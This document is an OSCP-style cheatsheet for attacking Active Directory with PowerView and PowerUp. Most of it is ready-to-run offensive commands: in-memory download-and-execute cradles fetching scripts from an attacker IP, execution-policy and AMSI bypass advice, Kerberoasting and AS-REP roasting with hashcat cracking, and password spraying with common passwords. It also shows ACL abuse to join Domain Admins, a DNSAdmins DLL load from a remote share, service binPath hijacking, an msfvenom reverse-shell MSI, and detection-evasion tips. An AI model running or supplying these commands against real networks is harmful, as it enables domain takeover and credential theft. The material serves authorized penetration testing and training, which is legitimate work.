# PowerView & PowerUp — Domain Enumeration Cheatsheet
> **OSCP Edition** | Active Directory Penetration Testing Reference

##POWERUP AND POWERVIEW
## https://github.com/PowerShellMafia/PowerSploit
---

## Table of Contents
1. [Setup & Prerequisites](#setup--prerequisites)
2. [Domain Recon](#domain-recon)
3. [User Enumeration](#user-enumeration)
4. [Group Enumeration](#group-enumeration)
5. [Host & Share Enumeration](#host--share-enumeration)
6. [ACL & GPO Enumeration](#acl--gpo-enumeration)
7. [Attack Paths](#attack-paths)
8. [PowerUp — Local PrivEsc](#powerup--local-privesc)
9. [OpSec Reference](#opsec-reference)
10. [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## Setup & Prerequisites

### Load PowerView (in-memory — preferred)
```powershell
# From web server (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://<yourip>/PowerView.ps1')

# From disk
Import-Module .\PowerView.ps1

# Bypass execution policy for current session only
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
powershell -ep bypass -c "Import-Module .\PowerView.ps1"
```

### Load PowerUp
```powershell
Import-Module .\PowerUp.ps1

# Or in-memory
IEX (New-Object Net.WebClient).DownloadString('http://<yourip>/PowerUp.ps1')
```

> **Note:** Load in-memory where possible — no file written to disk is significantly harder to detect. Combine with an AMSI bypass before dot-sourcing if AV is present.

---

## Domain Recon

> **Why:** Establishes the baseline context for your engagement — domain name, DC locations, trust relationships, and password policy. Always start here before anything else.

### Basic Domain Info
```powershell
# Current domain object — name, DC, forest, SID prefix
Get-NetDomain

# Forest info — all domains in the forest
Get-NetForest
# Why: Critical for multi-domain environments; maps the full scope

# All forest domains
Get-NetForestDomain

# Current user context
whoami /all
# Why: Confirms your privileges and group memberships before proceeding
```

### Domain Controllers
```powershell
# List all DCs with details
Get-NetDomainController
# Why: DCs are primary targets — get their IPs and OS versions

# DC for a specific domain
Get-NetDomainController -Domain <domain.local>
```

### Domain Trusts
```powershell
# Domain trusts — inbound/outbound
Get-NetDomainTrust
# Why: Bidirectional trusts = potential pivot path to other domains

# Forest trusts
Get-NetForestTrust
# Why: External forest trusts can enable cross-forest attacks

# All trusts recursively
Get-NetForestDomain | Get-NetDomainTrust
```

### Password Policy
```powershell
# Full domain password policy
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess

# Quick lockout threshold check
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess | Select-Object LockoutBadCount, ResetLockoutCount
# Why: CRITICAL before spraying — know the lockout threshold and stay 2 under it

# Alternative method
net accounts /domain
```

---

## User Enumeration

> **Why:** Users are your targets for credential attacks (Kerberoasting, AS-REP roasting, spraying). Enumeration reveals high-value accounts, misconfigured attributes, and attack vectors.

### Basic User Enumeration
```powershell
# All domain users — core fields
Get-NetUser | Select-Object samaccountname, description, pwdlastset, logoncount, lastlogon

# Specific user details
Get-NetUser -Identity <username>
# Why: Reveals group membership, last logon, UAC flags, SPN, and more

# All users with descriptions (quick win hunting)
Get-NetUser | Where-Object {$_.description -ne $null} | Select-Object samaccountname, description
# Why: Lazy admins frequently store cleartext passwords in user description fields

# Active users only (logged in last 90 days)
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-90)} | Select-Object samaccountname, lastlogon
# Why: Narrows your spray/attack list to accounts worth targeting; avoids noise from stale accounts

# Users with passwords that never expire
Get-NetUser | Where-Object {$_.useraccountcontrol -band 65536} | Select-Object samaccountname
# Why: These accounts often have old, weak passwords and are high-value spray targets

# Export full user list
Get-NetUser | Select-Object samaccountname | Out-File users.txt
```

### Kerberoastable Users (SPN Accounts)
```powershell
# Find all accounts with SPNs set
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset
# Why: Any user account with an SPN can be Kerberoasted — you get a TGS ticket
#      to crack offline. Prioritize accounts with old pwdlastset dates.

# Get SPN details
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof, pwdlastset, description

# Request TGS and dump crackable hashes (Hashcat format)
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# Save hashes to file
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath C:\Temp\kerberoast_hashes.txt -Encoding ASCII
# Then crack: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force
```

### AS-REP Roastable Users
```powershell
# Find users with pre-authentication disabled
Get-NetUser -PreAuthNotRequired | Select-Object samaccountname, useraccountcontrol
# Why: No pre-auth required = you can request an AS-REP hash WITHOUT credentials.
#      Crack with hashcat -m 18200. This requires zero auth — do it early.

# Get AS-REP hash for a specific user
Get-ASREPHash -UserName <username> -Verbose

# Get hashes for all AS-REP roastable users
Invoke-ASREPRoast -OutputFormat Hashcat
# Then crack: hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

### Session & Logon Hunting
```powershell
# Who is currently logged on to a specific host
Get-NetLoggedon -ComputerName <hostname>
# Why: Active sessions = tokens in memory = PTH/token stealing targets

# Find where a specific user is logged on (scans all domain hosts)
Find-DomainUserLocation -UserIdentity <username>
# Why: After cracking a hash, find where that account has active sessions

# Find where Domain Admins are logged on — HIGH VALUE
Find-DomainUserLocation -GroupIdentity "Domain Admins"
# Why: The holy grail — tells you exactly which machines have DA tokens available.
#      Combine with local admin access for credential extraction.

# Active RDP sessions
Get-NetRDPSession -ComputerName <hostname>
```

---

## Group Enumeration

> **Why:** Group membership defines access. Nested groups often grant unexpected privileges. Key targets: Domain Admins, Enterprise Admins, DNSAdmins, Backup Operators, Account Operators.

### Core Group Enumeration
```powershell
# All domain groups with descriptions
Get-NetGroup | Select-Object name, description
# Why: Custom group names reveal purpose and potential value

# Domain Admins — always check with -Recurse
Get-NetGroupMember "Domain Admins" -Recurse
# Why: -Recurse resolves nested groups. Without it you miss users in sub-groups.

# Enterprise Admins (forest-wide rights)
Get-NetGroupMember "Enterprise Admins" -Recurse
# Why: EA = forest-wide domain admin equivalent. Ultimate target in multi-domain forests.

# All groups a specific user belongs to
Get-NetGroup -UserName <username>
# Why: Run this on every account you compromise to discover unexpected access

# Nested group membership for a user
Get-NetGroupMember -Identity <groupname> -Recurse | Where-Object {$_.MemberObjectClass -eq "user"}
```

### High-Value Groups
```powershell
# DNSAdmins — privesc path to DA
Get-NetGroupMember "DNSAdmins"
# Why: DNSAdmins can load an arbitrary DLL as SYSTEM via the DNS service.
#      Well-known privesc path to DA: dnscmd /config /serverlevelplugindll \\<ip>\share\evil.dll

# Backup Operators — can read any file
Get-NetGroupMember "Backup Operators"
# Why: Can read SAM/NTDS.dit regardless of permissions. Treat as equivalent to DA.

# Account Operators — can create/modify users
Get-NetGroupMember "Account Operators"
# Why: Can create accounts and add to non-protected groups. Can self-escalate.

# Remote Desktop Users
Get-NetGroupMember "Remote Desktop Users"
# Why: RDP access to systems without local admin. Good lateral movement path.

# Server Operators
Get-NetGroupMember "Server Operators"
# Why: Can manage services and log on to DCs. High-value target.

# Print Operators
Get-NetGroupMember "Print Operators"
# Why: Can load drivers on DCs — potential code execution as SYSTEM.
```

### Local Admin Hunting
```powershell
# Find all hosts where current user has local admin (noisy — see OpSec)
Find-LocalAdminAccess -Verbose
# Why: Discovers lateral movement paths from your current token. Use -Delay for stealth.

# Stealthier version with delay
Find-LocalAdminAccess -Delay 3 -Jitter 0.3

# Local admins on a specific host
Get-NetLocalGroup -ComputerName <hostname>
# Why: Understand who can authenticate to a target before attempting lateral movement

# Local group members
Get-NetLocalGroupMember -ComputerName <hostname> -GroupName "Administrators"
```

---

## Host & Share Enumeration

> **Why:** Hosts contain credentials, configs, and attack surfaces. Shares expose sensitive files. Sessions reveal where credentials are cached.

### Computer Enumeration
```powershell
# All domain computers with OS info
Get-NetComputer | Select-Object dnshostname, operatingsystem, lastlogon
# Why: Old OS versions (Server 2008, Win7) = likely unpatched = juicy targets

# Filter by OS
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -OperatingSystem "*Windows 7*"

# Ping sweep — only returns live hosts
Get-NetComputer -Ping | Select-Object dnshostname
# Why: Use this as input for session/share hunting to avoid timeouts

# Servers only (exclude workstations)
Get-NetComputer | Where-Object {$_.operatingsystem -like "*Server*"}
```

### Share Enumeration
```powershell
# Find all accessible shares across the domain
Find-DomainShare -CheckShareAccess
# Why: -CheckShareAccess filters to shares your token can READ. Most important flag.

# Hunt for interesting files in accessible shares
Find-InterestingDomainShareFile -Include "*.xml","*.ini","*.config","*.txt","*pass*","*cred*","*secret*","*.kdbx"
# Why: Finds config files, credential files, and scripts across all accessible shares.

# More targeted file hunt
Find-InterestingDomainShareFile -Include "web.config","applicationHost.config","Groups.xml","Services.xml"
# Why: These specific files commonly contain cleartext credentials

# Shares on a specific host
Get-NetShare -ComputerName <hostname>
# Why: Non-default shares (not ADMIN$, C$, IPC$) are custom and often interesting

# Check SYSVOL for GPP passwords (legacy but still found)
ls \\<domain>\SYSVOL\<domain>\Policies\ -Recurse | Where-Object {$_.name -like "Groups.xml"}
```

### Session Enumeration
```powershell
# Active sessions on a specific host
Get-NetSession -ComputerName <hostname>
# Why: Sessions = tokens in memory = Pass-the-Hash targets

# Sessions on all domain controllers
Get-NetDomainController | ForEach-Object { Get-NetSession -ComputerName $_.Name }
# Why: DCs often have admin sessions — highest-value session hunting target

# All sessions across all domain computers (very noisy)
Get-NetComputer -Ping | ForEach-Object { Get-NetSession -ComputerName $_.dnshostname }
```

---

## ACL & GPO Enumeration

> **Why:** Misconfigured ACEs are one of the most reliable paths to DA. GenericAll, GenericWrite, WriteDACL, and WriteOwner on privileged objects effectively give you full control over them.

### ACL Enumeration
```powershell
# ACLs on a specific object
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs
# Why: -ResolveGUIDs is ESSENTIAL — without it, rights show as raw unreadable GUIDs

# ACLs for a group
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights

# Find all interesting/dangerous ACEs across the domain
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights
# Why: Automated hunt for dangerous ACEs. Look for GenericAll/Write/WriteDACL on DA accounts or groups.

# What rights does YOUR current account have
$mySid = (Get-DomainUser $env:USERNAME).objectsid
Get-DomainObjectAcl -Identity * | Where-Object { $_.SecurityIdentifier -eq $mySid }
# Why: Often reveals unexpected write access granted to service accounts
```

### Exploiting Dangerous ACEs

#### GenericAll on a User (Full Control)
```powershell
# Reset target's password
Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# Why: GenericAll = full control. Fastest path — just reset and authenticate.

# OR: Add SPN to make them Kerberoastable
Set-DomainObject -Identity <target> -Set @{serviceprincipalname='fake/spn.domain.local'}
Invoke-Kerberoast -Identity <target> -OutputFormat Hashcat
# Why: Doesn't change their password — less disruptive and more stealthy

# OR: Enable AS-REP roasting on them
Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304}
Get-ASREPHash -UserName <target>
```

#### GenericWrite on a User
```powershell
# Add SPN to make Kerberoastable (same as above — GenericWrite allows attribute modification)
Set-DomainObject -Identity <target> -Set @{serviceprincipalname='fake/spn.domain.local'}
Invoke-Kerberoast -Identity <target> -OutputFormat Hashcat
```

#### WriteDACL on a Group or Object
```powershell
# Grant yourself GenericAll on the object first
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity <youruser> -Rights All
# Then add yourself to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members <youruser>
```

#### ForceChangePassword
```powershell
# Reset target password without knowing current password
Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'Pass@123' -AsPlainText -Force)
# Why: High impact on service accounts that are DA members
```

#### WriteOwner
```powershell
# Take ownership of object, then grant yourself rights
Set-DomainObjectOwner -Identity <target> -OwnerIdentity <youruser>
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <youruser> -Rights All
```

### GPO Enumeration
```powershell
# All GPOs with SYSVOL paths
Get-NetGPO | Select-Object displayname, gpcfilesyspath
# Why: SYSVOL path lets you browse GPO files directly for credentials (Groups.xml etc.)

# GPOs applied to a specific host
Get-NetGPO -ComputerIdentity <hostname>

# Find GPOs you can modify (code exec on linked OUs)
Get-NetGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "Write|Modify" }
# Why: Write access to a GPO linked to a DC OU = code execution as SYSTEM on those DCs

# OUs in the domain
Get-NetOU
# Why: Understand the OU structure to identify GPO link targets
```

### Delegation Abuse
```powershell
# Unconstrained delegation computers — VERY HIGH VALUE
Get-NetComputer -Unconstrained
# Why: These hosts store TGTs in memory for any user that authenticates to them.
#      Coerce a DA to authenticate (printer bug, PetitPotam) and extract the DA TGT.

# Unconstrained delegation users
Get-NetUser -AllowDelegation | Where-Object {$_.useraccountcontrol -band 524288}

# Constrained delegation users
Get-NetUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
# Why: Can impersonate any user to specific services — lateral movement path

# Resource-Based Constrained Delegation (RBCD)
Get-NetComputer | Where-Object {$_."msds-allowedtoactonbehalfofotheridentity" -ne $null}
```

---

## Attack Paths

> These are the core attack techniques you'll use after enumeration. All require prior PowerView enumeration to identify targets.

### Kerberoasting — Full Workflow
```powershell
# Step 1: Find targets — prioritize old passwords
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset | Sort-Object pwdlastset

# Step 2: Dump hashes
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File C:\Temp\hashes.txt -Encoding ASCII

# Step 3: Crack on attack box
# hashcat -m 13100 hashes.txt rockyou.txt --force
# hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule --force
```

### AS-REP Roasting — Full Workflow
```powershell
# Step 1: Find targets (no credentials needed for this check)
Get-NetUser -PreAuthNotRequired | Select-Object samaccountname

# Step 2: Get hash
Get-ASREPHash -UserName <username> -Verbose
# OR for all targets:
Invoke-ASREPRoast -OutputFormat Hashcat | Out-File C:\Temp\asrep_hashes.txt -Encoding ASCII

# Step 3: Crack on attack box
# hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

### Password Spraying
```powershell
# Step 1: Get password policy — ALWAYS do this first
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess | Select-Object LockoutBadCount, ResetLockoutCount
# Rule: Stay at least 2 attempts UNDER the lockout threshold per reset window

# Step 2: Build user list
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-90)} | Select-Object -ExpandProperty samaccountname | Out-File users.txt

# Step 3: Spray — ONE password at a time, wait between rounds
Invoke-DomainPasswordSpray -Password "Winter2024!" -UserList users.txt -Verbose

# Common spray passwords
# Season+Year: Winter2024!, Spring2024!, Summer2024!, Fall2024!
# Company name variations
# Welcome1!, Password1!, P@ssw0rd
# Wait 30-60 min between rounds to avoid lockout
```

### BloodHound Collection
```powershell
# Full collection — most comprehensive
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\
# Why: Collects sessions, ACLs, group membership, trusts, and more.
#      Import the ZIP into BloodHound GUI to visualize all attack paths graphically.

# DCOnly — stealth option (LDAP to DC only)
Invoke-BloodHound -CollectionMethod DCOnly
# Why: Only queries DC via LDAP. No lateral connections to workstations — much quieter.

# Session collection only
Invoke-BloodHound -CollectionMethod Session
```

### Pass-the-Hash (after obtaining NTLM hash)
```powershell
# Using built-in tools (requires Invoke-Mimikatz or similar)
# The key is to identify the target using PowerView first:
Find-DomainUserLocation -GroupIdentity "Domain Admins"  # Find where DA tokens are
Find-LocalAdminAccess                                    # Find where you have local admin

# Then use your PTH tool of choice targeting those specific hosts
```

---

## PowerUp — Local PrivEsc

> **Why:** PowerUp focuses on local privilege escalation. Run it every time you land on a new host — it takes seconds and often reveals instant wins.

### The One Command to Always Run First
```powershell
Invoke-AllChecks
# Why: Runs every PowerUp check and highlights exploitable findings in red.
#      This is your starting point on every new box — run before anything else.
```

### Service Abuse
```powershell
# Services with modifiable binary paths
Get-ModifiableServiceFile
# Why: If you can overwrite the service binary, replace it with a reverse shell
#      or add-local-admin payload. Restart the service to trigger execution as SYSTEM.

# Services with weak ACL permissions (can change binary path)
Get-ModifiableService
# Why: Can change the binPath to your payload — requires service restart to trigger.

# Unquoted service paths with spaces
Get-UnquotedService
# Why: Windows resolves ambiguous unquoted paths — plant your binary at the
#      expected location. Triggered on service restart.

# Auto-exploit a modifiable service (adds your user to local admins)
Invoke-ServiceAbuse -Name '<ServiceName>' -UserName 'domain\youruser'
# Why: One-liner to exploit a weak service and gain local admin.

# Fix it manually (change binPath to a command)
sc.exe config <ServiceName> binpath= "net localgroup administrators <user> /add"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```

### Registry & Scheduled Tasks
```powershell
# AlwaysInstallElevated check — quick win
Get-RegistryAlwaysInstallElevated
# Why: If both HKLM and HKCU keys are set, ANY MSI installs as SYSTEM.
#      Create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi

# Autologon credentials in registry
Get-RegistryAutoLogon
# Why: Cleartext credentials stored for auto-logon. Common in kiosk/lab environments.

# Modifiable scheduled task files
Get-ModifiableScheduledTaskFile
# Why: If you can overwrite a file run by a scheduled task running as SYSTEM, you win.
```

### DLL Hijacking
```powershell
# Find writable PATH directories for DLL hijacking
Find-PathDLLHijack
# Why: Plant a malicious DLL with the expected name in the writable PATH directory.
#      When the application loads, it executes your DLL instead.

# Find processes with DLL hijacking potential
Find-ProcessDLLHijack
```

### Credential Hunting
```powershell
# Cached GPP credentials (classic but still found in the wild)
Get-CachedGPPPassword
# Why: Group Policy Preferences used to store passwords encrypted with AES.
#      Microsoft published the key — they're trivially decryptable.
#      Found on older domains that haven't cleaned up legacy GPOs.

# Web config credential files (look for IIS/web app creds)
Get-ModifiablePath | Where-Object {$_.ModifiablePath -like "*inetpub*"}
# Why: web.config and applicationHost.config often contain cleartext DB passwords.

# All credentials in the vault
Get-VaultCredential
# Why: Windows Credential Manager sometimes stores domain credentials.
```

---

## OpSec Reference

### Noise Level by Command

**QUIET — LDAP only, DC traffic (safe to run freely)**
```powershell
Get-NetUser
Get-NetGroup
Get-NetComputer
Get-NetDomain
Get-NetDomainController
Get-NetDomainTrust
Get-ObjectAcl
Get-NetGPO
Find-InterestingDomainAcl
```
> These are standard LDAP queries to the DC — normal domain traffic. Indistinguishable from a legitimate admin running PowerShell.

**MODERATE — Targeted host connections**
```powershell
Get-NetSession -ComputerName <single-host>
Get-NetLocalGroup -ComputerName <single-host>
Get-NetShare -ComputerName <single-host>
```
> Connects to specific hosts. Use when you already have a target in mind.

**NOISY — Touches every domain host**
```powershell
Find-LocalAdminAccess
Find-DomainUserLocation
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile
Get-NetComputer | ForEach-Object { ... }   # Any loop over all hosts
```
> These touch every host in the domain sequentially. Generates significant network traffic. Use `-Delay` and `-Jitter`, or limit scope.

### Delay Flags for Noisy Scans
```powershell
# Add delays to reduce traffic spikes
Find-LocalAdminAccess -Delay 3 -Jitter 0.3
Find-DomainUserLocation -Delay 5 -Jitter 0.5

# Limit scope to specific hosts
Find-LocalAdminAccess -ComputerName server01,server02,dc01
```

### Alternate Credentials
```powershell
# Run enumeration as a different user after cracking a hash
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))

Get-NetUser -Credential $cred
Get-NetComputer -Credential $cred
Invoke-Kerberoast -Credential $cred -OutputFormat Hashcat
```

### Target Specific DC
```powershell
# Avoid auto-discovery — target a known DC directly
Get-NetUser -Domain <domain.local> -DomainController <DC-IP>
# Why: More predictable traffic, easier to route through pivots
```

### Execution Policy Bypasses
```powershell
# Process-scoped — reverts on shell close, minimal footprint
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Command-line bypass
powershell -ep bypass -c "..."

# Encoded command
powershell -EncodedCommand <base64>

# Via stdin
echo IEX(New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1') | powershell -nop
```

---

## Quick Reference Cheatsheet

### Domain Baseline
| Goal | Command |
|------|---------|
| Domain info | `Get-NetDomain` |
| Find DCs | `Get-NetDomainController` |
| Password policy | `Get-DomainPolicyData \| Select -ExpandProperty SystemAccess` |
| Domain trusts | `Get-NetDomainTrust` |
| Forest trusts | `Get-NetForestTrust` |

### High-Value User Targets
| Goal | Command |
|------|---------|
| Kerberoastable accounts | `Get-NetUser -SPN` |
| AS-REP roastable accounts | `Get-NetUser -PreAuthNotRequired` |
| Passwords in descriptions | `Get-NetUser \| Where-Object {$_.description -ne $null}` |
| Find DA sessions | `Find-DomainUserLocation -GroupIdentity "Domain Admins"` |

### Group Targets
| Goal | Command |
|------|---------|
| Domain Admins members | `Get-NetGroupMember "Domain Admins" -Recurse` |
| Enterprise Admins | `Get-NetGroupMember "Enterprise Admins" -Recurse` |
| DNSAdmins (privesc) | `Get-NetGroupMember "DNSAdmins"` |
| Backup Operators | `Get-NetGroupMember "Backup Operators"` |
| My group memberships | `Get-NetGroup -UserName $env:USERNAME` |

### Access Discovery
| Goal | Command |
|------|---------|
| Where I'm local admin | `Find-LocalAdminAccess` |
| Open shares | `Find-DomainShare -CheckShareAccess` |
| Interesting files | `Find-InterestingDomainShareFile` |
| Active sessions | `Get-NetSession -ComputerName <host>` |
| Unconstrained delegation | `Get-NetComputer -Unconstrained` |

### ACL Abuse Quick Reference
| ACE Type | What You Can Do |
|----------|----------------|
| `GenericAll` on user | Reset password, add SPN, enable AS-REP roast |
| `GenericAll` on group | Add members |
| `GenericWrite` on user | Set attributes (add SPN for Kerberoasting) |
| `WriteDACL` | Grant yourself GenericAll |
| `WriteOwner` | Take ownership, then grant GenericAll |
| `ForceChangePassword` | Reset password without knowing current |
| `AllExtendedRights` | Reset password, read LAPS passwords |

### PowerUp Quick Wins
| Check | Command |
|-------|---------|
| All checks at once | `Invoke-AllChecks` |
| Writable service binaries | `Get-ModifiableServiceFile` |
| Weak service ACLs | `Get-ModifiableService` |
| Unquoted paths | `Get-UnquotedService` |
| AlwaysInstallElevated | `Get-RegistryAlwaysInstallElevated` |
| Autologon creds | `Get-RegistryAutoLogon` |
| Cached GPP creds | `Get-CachedGPPPassword` |
| DLL hijack paths | `Find-PathDLLHijack` |

### Cracking Reference
| Attack | Hashcat Mode | Command |
|--------|-------------|---------|
| Kerberoasting | 13100 | `hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule` |
| AS-REP Roasting | 18200 | `hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule` |
| NTLMv2 (Responder) | 5600 | `hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule` |
| NTLM | 1000 | `hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule` |

### Attack Flow Summary
```
1. Get-NetDomain / Get-NetDomainController          ← Baseline
2. Get-DomainPolicyData (password policy)           ← Before spraying
3. Get-NetUser -SPN / -PreAuthNotRequired           ← Kerberoast / AS-REP
4. Get-NetUser (description hunting)               ← Quick wins
5. Get-NetGroupMember "Domain Admins" -Recurse     ← Who to target
6. Find-InterestingDomainAcl -ResolveGUIDs         ← ACL abuse paths
7. Get-NetComputer -Unconstrained                  ← Delegation abuse
8. Find-DomainUserLocation -GroupIdentity "DA"     ← Where to pivot
9. Find-LocalAdminAccess                           ← Where to move
10. Invoke-AllChecks (PowerUp)                     ← Local privesc
```

---

## Resources
- [PowerView Cheat Sheet (HarmJ0y)](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [PayloadsAllTheThings — AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

---
*For educational and authorized penetration testing purposes only.*
